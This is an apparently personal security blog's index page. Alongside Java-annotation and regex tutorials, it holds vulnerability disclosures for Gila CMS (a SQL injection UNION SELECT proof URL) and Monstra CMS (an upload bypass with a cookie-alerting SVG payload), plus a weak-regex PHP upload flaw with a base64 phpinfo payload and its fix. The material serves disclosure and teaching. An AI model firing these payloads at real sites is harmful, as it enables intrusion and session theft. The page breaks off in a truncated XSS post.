<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>beautiful test</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="beautiful test">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="beautiful test">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="beautiful test">
  
    <link rel="alternate" href="/atom.xml" title="beautiful test" type="application/atom+xml">
  
  
    <link rel="icon" href="/images/default-avatar.jpg">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/highlight.css">
  <script>
  let antiquityStorage = window.sessionStorage.getItem('antiquitySessionStorage');
  if (antiquityStorage == '' || antiquityStorage == null) {
    var antiquityLoader = '<div id="loaderbox"><div class="loader"><div class="load-roll"><div class="load-top"></div><div class="load-right"></div><div class="load-bottom"></div></div></div></div>';
    document.write(antiquityLoader);
    document.body.style.overflow = 'hidden'
  }
  </script>
</head>
</html>
<body>
  <div id="fullpage" class="mobile-nav-right">
    
      <div id="wrapper" style="background-image: url(/images/test.jpg)" title="为了更安全的互联网">
    
    
      <header id="header">
  <div id="nav-toggle" class="nav-toggle"></div>
  <div class="head-box global-width">
    <nav class="nav-box nav-right">
      
        <a class="nav-item" href="/" title
        
        >首页</a>
      
        <a class="nav-item" href="/archives" title
        
        >归档</a>
      
    </nav>
  </div>
</header>
      <div id="middlecontent" title class="global-width sidebar-right">
        <section id="main">
  
    <article id="post-Java注解" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/20/Java注解/">Java注解</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/20/Java注解/" class="article-date">
  <time datetime="2019-10-20T05:53:44.000Z" itemprop="datePublished">2019-10-20</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>温故而知新，总结一下<br><strong>0x01 注解基础知识</strong><br>注解和jdk版本关系：从JDK5开始<br>什么是注解：代码的标签，是源代码的元数据。<br>注解的作用：读懂别人的代码，简化代码的配置<br>注解的本质：1，附属于代码，依赖于方法，类，属性存在<br>         2，本身没有任何作用，在恰当的时候有外部程序解析产生<br>注解的分类：1，JDk内置注解（@Override、@Derprecated、@SupperWarnings）<br>         2，第三方框架的注解：<br>          Spring：@Autowired @Controller @Service @Respository<br>          Mybatis:@InsertProvider @Update @Options<br>         3,按照生命周期进行分类：<br>          （1），SOURCE源码注解<br>          （2），CLASS编译时注解：存在于源码及class文件中<br>          （3）, RUNTIME运行时注解：注解保留到运行时，甚至还会影响运行逻辑，@autowired属于运行时注解</p>
<p>元注解：注解的注解<br>   @Retention 定义生命周期，可选值：SOURCE,CLASS，RUNTIME<br>   @Documented 文档化注解<br>   @Inherited 注解是自动继承的<br>   @Target 注解的使用范围</p>
<p>   自定义注解无法规则：成员以无参方式声明；可以使用deafault关键字指定默认值，成员类型是受限制的，合法的类型包括<br>   注解类可以没有成员，没有成员的注解称为标识注解</p>
<p><strong>0x02举个例子</strong><br>   编辑器环境：IDEA<br>   定义一个注解类：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import javax.management.relation.RelationType;</span><br><span class="line">import java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line">@Target (&#123;ElementType.METHOD,ElementType.TYPE&#125;)</span><br><span class="line">@Retention (RetentionPolicy.RUNTIME)//注解可以保留到程序运行的时候</span><br><span class="line">@Inherited</span><br><span class="line">@Documented</span><br><span class="line">public @interface Description &#123;//注解的属性</span><br><span class="line">    String desc();//描述内容</span><br><span class="line">    String author();//描述作者</span><br><span class="line">    int age() default 18;//描述年龄</span><br><span class="line">    /*</span><br><span class="line">     */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>定义一个普通类</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">@Description (</span><br><span class="line">        desc = &quot;a&quot;,</span><br><span class="line">        author = &quot;b&quot;,</span><br><span class="line">        age = 19</span><br><span class="line">)</span><br><span class="line">public class testnew &#123;</span><br><span class="line">  String desc;</span><br><span class="line">  String author;</span><br><span class="line">  int age;</span><br><span class="line"></span><br><span class="line">    public String getDesc() &#123;</span><br><span class="line">        return desc;</span><br><span class="line">    &#125;</span><br><span class="line">    @Description (</span><br><span class="line">            desc = &quot;a&quot;,</span><br><span class="line">            author = &quot;b&quot;,</span><br><span class="line">            age = 19</span><br><span class="line">    )</span><br><span class="line">    public void setDesc(String desc) &#123;</span><br><span class="line">        this.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getAuthor() &#123;</span><br><span class="line">        return author;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAuthor(String author) &#123;</span><br><span class="line">        this.author = author;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        this.age=1;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line"></span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>main方法读取类的注解，一些知名的框架通过注解来实现配置简单化，这个时候往往用到了java反射机制来实现，这也就是为什么有些课程会讲到框架的底层靠反射实现</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import com.sun.tools.javac.comp.Annotate;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.lang.annotation.Annotation;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;Hello World!&quot;);</span><br><span class="line">        test1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void test1()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //使用类加载器</span><br><span class="line">            Class clazz = Class.forName ( &quot;testnew&quot;);</span><br><span class="line">            //类是否有注解</span><br><span class="line">            boolean isClsExits =clazz.isAnnotationPresent ( Description.class );//</span><br><span class="line">            System.out.println (isClsExits);</span><br><span class="line"></span><br><span class="line">            if (isClsExits)&#123;</span><br><span class="line">                Description test=(Description)clazz.getAnnotation(Description.class);</span><br><span class="line">                System.out.println (test.author ());</span><br><span class="line">            &#125;</span><br><span class="line">            //获取类的注解</span><br><span class="line">            Annotation[] annotations=clazz.getAnnotations ();</span><br><span class="line"></span><br><span class="line">            for (Annotation a :annotations)&#123;</span><br><span class="line">                System.out.println (a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //获取 方法的注解</span><br><span class="line">            Method[] met =clazz.getMethods ();</span><br><span class="line">            for (Method method :met)&#123;</span><br><span class="line">                boolean ismetExits =method.isAnnotationPresent (Description.class );</span><br><span class="line">                if (ismetExits)&#123;</span><br><span class="line">                Description des =(Description)method.getAnnotation (Description.class);</span><br><span class="line">                //获取方法的注解的某个属性</span><br><span class="line">                    System.out.println (des.age ());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            System.out.println (clazz.getName ());//获取包名和类名</span><br><span class="line">            System.out.println (clazz.getSimpleName ());//获取类名</span><br><span class="line">            //调用类的方式1</span><br><span class="line">//            Object object = clazz.newInstance();</span><br><span class="line">            Method method = clazz.getMethod(&quot;getAge&quot;);//获取类的某个方法</span><br><span class="line">//            System.out.println(method.invoke(object));</span><br><span class="line">            //调用类的方式2</span><br><span class="line">            Object obj = method.invoke(clazz.newInstance());</span><br><span class="line"></span><br><span class="line">            System.out.println(obj);</span><br><span class="line">            //获取类的所有方法</span><br><span class="line">//            Method[] methods1 = clazz.getMethods();</span><br><span class="line">//            for (Method method2 : methods1) &#123;</span><br><span class="line">//                //获取类中方法的全名(eg:public com.test.Main())</span><br><span class="line">//                System.out.println(method2);</span><br><span class="line">//            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>main方法运行结果：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">true</span><br><span class="line">b</span><br><span class="line">@Description(age=19, desc=a, author=b)</span><br><span class="line">19</span><br><span class="line">testnew</span><br><span class="line">testnew</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div>
      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-SQL-injection-in-Gila-CMS-version-1-11-4" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/13/SQL-injection-in-Gila-CMS-version-1-11-4/">SQL injection in Gila CMS version 1.11.4</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/13/SQL-injection-in-Gila-CMS-version-1-11-4/" class="article-date">
  <time datetime="2019-10-13T10:03:05.000Z" itemprop="datePublished">2019-10-13</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>0x01</strong><br>I installed the latest version of GilaCMS (v1.11.4). After the administrator log in to the website, the search for the sql injection vulnerability exists in the content-&gt;pages-&gt;posts page.</p>
<p>The vulnerability related code is in lines 101 to 127 of /src/core/controllers/cm.php, the parameter $_GET is not filtered, and the line is directly brought into the getRows function to perform data query in line 122, resulting in sql injection.</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function list_rowsAction ()</span><br><span class="line">&#123;</span><br><span class="line">  header(&apos;Content-Type: application/json&apos;);</span><br><span class="line">  $table = router::get(&quot;t&quot;,1);</span><br><span class="line">  $result = self::list_rows($table, $_GET, $_GET);</span><br><span class="line">  echo json_encode($result, JSON_PRETTY_PRINT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function list_rows ($table, $filters, $args)</span><br><span class="line">&#123;</span><br><span class="line">  if(isset($args[&apos;groupby&apos;])&amp;&amp;$args[&apos;groupby&apos;]!=null) &#123;</span><br><span class="line">    $this-&gt;group_rowsAction();</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  $pnk = new gTable($table, $this-&gt;permissions);</span><br><span class="line">  if(!$pnk-&gt;can(&apos;read&apos;)) return;</span><br><span class="line">  $result = [];</span><br><span class="line"></span><br><span class="line">  $fieldlist = isset($args[&apos;id&apos;]) ? &apos;edit&apos; : &apos;list&apos;;</span><br><span class="line">  $result[&apos;fields&apos;] = $pnk-&gt;fields($fieldlist);</span><br><span class="line">  $result[&apos;rows&apos;] = [];</span><br><span class="line">  $res = $pnk-&gt;getRows($filters, array_merge($args, [&apos;select&apos;=&gt;$result[&apos;fields&apos;]]));</span><br><span class="line">  foreach($res as $r) $result[&apos;rows&apos;][] = array_values($r);</span><br><span class="line">  $result[&apos;startIndex&apos;] = $pnk-&gt;startIndex($args);</span><br><span class="line">  $result[&apos;totalRows&apos;] = $pnk-&gt;totalRows($filters);</span><br><span class="line">  return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>0x02 Vulnerability certificate</strong><br>Vulnerability url:http://[address]:[port]/[app_path]/cm/list_rows/post?page=1&amp;search=qww’)+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT(‘123’,’456’),’789’)–+THB<br>Send a get query request after entering characters in the search box</p>
<p><img src="https://i.loli.net/2019/10/13/a3MgxbKeEjJIyO7.png" alt="F070CE3A-AF46-4258-888E-887DDEDBD717.png"></p>
<p>Then insert the SQL statement in the search parameter.Returns the field with 123456789 in the package, so you can execute sql. SQL injection exists</p>
<p><img src="https://i.loli.net/2019/10/13/VQEfxZP6OUv3m74.png" alt="A056417D-551C-4A59-9030-1EC061CE3475.png"></p>
<p><img src="https://i.loli.net/2019/10/13/j5vH74Zu6nB3sz8.png" alt="图片.png"><br>Sqlmap can also verify this vulnerability</p>
<p><img src="https://i.loli.net/2019/10/13/GNsEiIHy8vALBFM.png" alt="61FA3993-DD09-4AC4-BB88-140C0F02A642.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Bypass-the-HTML-file-suffix-restriction-when-uploading-files" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/12/Bypass-the-HTML-file-suffix-restriction-when-uploading-files/">Bypass the HTML file suffix restriction when uploading files</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/12/Bypass-the-HTML-file-suffix-restriction-when-uploading-files/" class="article-date">
  <time datetime="2019-10-12T12:55:33.000Z" itemprop="datePublished">2019-10-12</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>0x01</strong><br>I installed the latest version of monstra CMS and found upload bypass in the system<br><strong>In the latest version(3.0.4), the system forbids HTML suffix name upload, but now it can bypass it.</strong></p>
<p><img src="https://i.loli.net/2019/10/12/8PwIjNJXZu1TULV.png" alt="图片.png"></p>
<p><img src="https://i.loli.net/2019/10/12/FenPgaHhEcuR7xI.png" alt="图片.png"></p>
<p><strong>0x02</strong><br><strong>Vulnerability proof</strong></p>
<p>You can bypass the file upload limit by putting double quotes before the suffix of HTML </p>
<p>1  Visit website http://[address]:[port]/[app_path]/admin/index.php?id=filesmanager with login</p>
<p>2  Save html codes with ‘.png’extensions. and upload it like below.</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">    &lt;head&gt; </span><br><span class="line">	    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">        &lt;title&gt;hacker&lt;/title&gt; </span><br><span class="line">    &lt;/head&gt; </span><br><span class="line">    &lt;body&gt; </span><br><span class="line">     &lt;svg/onload=alert(document.cookie)&gt;</span><br><span class="line">    &lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2019/10/12/IKx9s3GArfTSLZa.png" alt="图片.png"></p>
<p>Click the uploaded file and Grab the packet and change the suffix name to XXX””.html at filename，This circumvents this limitation.</p>
<p><img src="https://i.loli.net/2019/10/12/gK1hOqvHtEIAJNL.png" alt="图片.png"></p>
<p><img src="https://i.loli.net/2019/10/12/tgcb9dJELnNDrx8.png" alt="图片.png"></p>
<p>4 move to http://[address]:[port]/[app_path]/public/uploads/[uploaded file]</p>
<p> You can see that you executed HTML and JS code，If you access this file,  you can get the administrator’s cookie and execute any JS code</p>
<p><img src="https://i.loli.net/2019/10/12/9oY3Vsy1IwCehjf.png" alt="图片.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-正则表达式总结和引起的思考" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/22/正则表达式总结和引起的思考/">正则表达式总结和引起的思考</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/09/22/正则表达式总结和引起的思考/" class="article-date">
  <time datetime="2019-09-21T17:26:46.000Z" itemprop="datePublished">2019-09-22</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>基础知识</strong><br><strong>前言：</strong>最近公司在搞POC和EXP，在看代码的时候发现有的部分已经生疏了，所以又回头总结一下，包括php和Python的具体函数和使用以及漏洞案例</p>
<h4 id="0x01-基础部分"><a href="#0x01-基础部分" class="headerlink" title="0x01 基础部分"></a>0x01 基础部分</h4><p>字符：<br>. 匹配任意字符除了\n<br>[…] 匹配字符集<br>\d \D匹配数字/非数字<br>\s \S 匹配空白/非空白字符<br>\w \W 匹配单词字符[a-zA-Z0-9]/非单词字符<br>量词：</p>
<ul>
<li>匹配前一个字符0次或者无限次</li>
</ul>
<ul>
<li>匹配前一个字符1次或者无限次<br>？匹配其哪一个字符0次或者1次<br>{m}/{m,n}匹配其哪一个字符m次或者n次</li>
</ul>
<p>*？/+? /?? 匹配模式变为非贪婪，尽可能少匹配字符<br>^匹配字符串开头<br>$匹配字符串结尾<br>\A/\Z指定的字符串匹配必须出现在开头/结尾</p>
<h4 id="0x02-Python"><a href="#0x02-Python" class="headerlink" title="0x02 Python"></a>0x02 Python</h4><p>re.findall(“”,) 使用<br>re.findall(“”,)匹配所有<br>re.search(“”,)匹配一次</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">In [1]: import re                                                               </span><br><span class="line"></span><br><span class="line">In [2]: a= &apos;C|Java|Pythonn|Javascript&apos;                                          </span><br><span class="line"></span><br><span class="line">In [3]: r =  re.findall(&quot;Python&quot;,a)</span><br><span class="line">In [5]: r                                                                       </span><br><span class="line">Out[5]: [&apos;Python&apos;]</span><br><span class="line"></span><br><span class="line">#匹配数字</span><br><span class="line">In [6]: a = &apos;C54Java433#4564 Python|Java&apos;                                       </span><br><span class="line"></span><br><span class="line">In [7]: r = re.findall(&quot;\d&quot;,a)                                                  </span><br><span class="line"></span><br><span class="line">In [8]: r                                                                       </span><br><span class="line">Out[8]: [&apos;5&apos;, &apos;4&apos;, &apos;4&apos;, &apos;3&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;4&apos;]</span><br><span class="line">In [31]: r = re.findall(&quot;\d+&quot;,a) </span><br><span class="line">In [32]: r                                                                      </span><br><span class="line">Out[32]: [&apos;54&apos;, &apos;433&apos;, &apos;4564&apos;]</span><br><span class="line">#匹配非单词字符</span><br><span class="line">In [21]: r = re.findall(&quot;\W&quot;,a)                                                 </span><br><span class="line"></span><br><span class="line">In [22]: r                                                                      </span><br><span class="line">Out[22]: [&apos;#&apos;, &apos; &apos;, &apos;|&apos;]</span><br></pre></td></tr></table></figure></div>

<p>用正则表达式匹配url<br>图片处’img src=”(.*?)”‘</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">In [9]: url = &quot;http://www.xiaohuar.com/2014.html&quot;                               </span><br><span class="line"></span><br><span class="line">In [10]: res=req.get(url)                                                       </span><br><span class="line"></span><br><span class="line">In [11]: url = re.findall(&apos;img src=&quot;(.*?)&quot;&apos;,res.text)                           </span><br><span class="line"></span><br><span class="line">In [12]: url                                                                    </span><br><span class="line">Out[12]: </span><br><span class="line">[&apos;/d/file/20160316/a0bab5b5cc4f695012f4af1d871e7256.jpg&apos;,</span><br><span class="line"> &apos;http://www.xiaohuar.com/d/file/20140811101923185.jpg&apos;]</span><br><span class="line"> ……</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> In [13]: for i in url: </span><br><span class="line">    ...:     if i.startswith(&apos;/d&apos;): </span><br><span class="line">    ...:         i=&quot;http://www.xiaohuar.com&quot;+i </span><br><span class="line">    ...:     print(i) </span><br><span class="line">    ...:                                                                        </span><br><span class="line">http://www.xiaohuar.com/d/file/20160316/a0bab5b5cc4f695012f4af1d871e7256.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20140811101923185.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/2b903e6d59bd1435a0b9ddfb5b4bd9c5.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20190814/5c01302d1d3e7f2fc6cbafbc19becaa8.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20161018/5385b7113046ac9ae560da41a44b12af.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/2ce538e9658af40bc034f5dfaf57826a.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20141116030511162.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/faf429bf24391374472fec693322b178.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20151206/f391a2312f448863f36db7d0d9acb84d.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/7249c06c326a75800fdb9a0e1d4c0df8.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20140916055435171.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20151109/a6a9f1cd6c721bb3fb1dfe6094a6eeb4.jpg</span><br></pre></td></tr></table></figure></div>

<p>当然可以使用解析库去解析如bs4</p>
<h4 id="0x03-php"><a href="#0x03-php" class="headerlink" title="0x03 php"></a>0x03 php</h4><p>引用W3schoool</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo str_replace(&quot;world&quot;,&quot;Shanghai&quot;,&quot;Hello world!&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">  </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">运行结果</span><br><span class="line">Hello Shanghai!</span><br></pre></td></tr></table></figure></div>

<p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
<p>语法：<br>int preg_match( string pattern, string subject [, array matches ] )<br>看seebug上大佬的某处代码审计案例解析</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public function upload() &#123;</span><br><span class="line"></span><br><span class="line">     // 创建图片存储文件夹</span><br><span class="line">     $dir = SYS_UPLOAD_PATH.&apos;/member/&apos;.$this-&gt;uid.&apos;/&apos;;</span><br><span class="line">     @dr_dir_delete($dir);</span><br><span class="line">     !is_dir($dir) &amp;&amp; dr_mkdirs($dir);</span><br><span class="line"></span><br><span class="line">     if ($_POST[&apos;tx&apos;]) &#123;</span><br><span class="line">         $file = str_replace(&apos; &apos;, &apos;+&apos;, $_POST[&apos;tx&apos;]);</span><br><span class="line">         if (preg_match(&apos;/^(data:\s*image\/(\w+);base64,)/&apos;, $file, $result))&#123;</span><br><span class="line">             $new_file = $dir.&apos;0x0.&apos;.$result[2];</span><br><span class="line">             if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &apos;&apos;, $file)))) &#123;</span><br><span class="line">                 exit(dr_json(0, &apos;目录权限不足或磁盘已满&apos;));</span><br><span class="line">             &#125; else &#123;</span><br><span class="line">                 $this-&gt;load-&gt;library(&apos;image_lib&apos;);</span><br><span class="line">                 $config[&apos;create_thumb&apos;] = TRUE;</span><br><span class="line">                 $config[&apos;thumb_marker&apos;] = &apos;&apos;;</span><br><span class="line">                 $config[&apos;maintain_ratio&apos;] = FALSE;</span><br><span class="line">                 $config[&apos;source_image&apos;] = $new_file;</span><br><span class="line">                 foreach (array(30, 45, 90, 180) as $a) &#123;</span><br><span class="line">                     $config[&apos;width&apos;] = $config[&apos;height&apos;] = $a;</span><br><span class="line">                     $config[&apos;new_image&apos;] = $dir.$a.&apos;x&apos;.$a.&apos;.&apos;.$result[2];</span><br><span class="line">                     $this-&gt;image_lib-&gt;initialize($config);</span><br><span class="line">                     if (!$this-&gt;image_lib-&gt;resize()) &#123;</span><br><span class="line">                         exit(dr_json(0, &apos;上传错误：&apos;.$this-&gt;image_lib-&gt;display_errors()));</span><br><span class="line">                         break;</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                 list($width, $height, $type, $attr) = getimagesize($dir.&apos;45x45.&apos;.$result[2]);</span><br><span class="line">                 !$type &amp;&amp; exit(dr_json(0, &apos;图片字符串不规范&apos;));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125; else &#123;</span><br><span class="line"></span><br><span class="line">             exit(dr_json(0, &apos;图片字符串不规范&apos;));</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         exit(dr_json(0, &apos;图片不存在&apos;));</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>

<p>问题出现preg_match(‘/^(data:\s*image/(\w+);base64,)/‘, $file, $result)处，正则表达式过滤不严格，导致 $result[2]变量可控制为php，而图片内容也可以是可控制的base64编码的部分，所以可以getshell<br>通过简单测试：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &quot;data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+&quot;;</span><br><span class="line">if(preg_match(&apos;/^(data:\s*image\/(\w+);base64,)/&apos;, $file, $result))&#123;</span><br><span class="line">    print_r($result); </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    print &quot;A match was not found.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">php test.php 运行结果 </span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; data:image/php;base64,</span><br><span class="line">    [1] =&gt; data:image/php;base64,</span><br><span class="line">    [2] =&gt; php</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>在php当中，’()’表示匹配的子模式，在代码中的正则用了俩次括号，所以得到数组有十三个<br>此处正确的正则表达式和代码应该为</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &quot;data:image/jpg;base64,PD9waHAgcGhwaW5mbygpOz8+&quot;;</span><br><span class="line">if(preg_match(&apos;/^(data:\s*image\/(jpg|png|jpeg);base64,)/&apos;, $file, $result))&#123;</span><br><span class="line">    print_r($result); </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    print &quot;A match was not found.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; data:image/jpg;base64,</span><br><span class="line">    [1] =&gt; data:image/jpg;base64,</span><br><span class="line">    [2] =&gt; jpg</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>关于php的正则细节可以参考<a href="https://blog.csdn.net/uglyfisher/article/details/79333586" target="_blank" rel="noopener">[https://blog.csdn.net/uglyfisher/article/details/79333586]</a><br>研究正则表达式，可以严谨代码书写规范，挖掘漏洞</p>
<h4 id="0x03-正则表达式引起的CPU过载"><a href="#0x03-正则表达式引起的CPU过载" class="headerlink" title="0x03 正则表达式引起的CPU过载"></a>0x03 正则表达式引起的CPU过载</h4><p>引用一处正则表达式回溯的案例<br><a href="https://www.jb51.net/article/163520.htm" target="_blank" rel="noopener">https://www.jb51.net/article/163520.htm</a></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Reflective-xss-on-admin-snippets-php" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/05/Reflective-xss-on-admin-snippets-php/">Reflective xss on admin/snippets.php</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
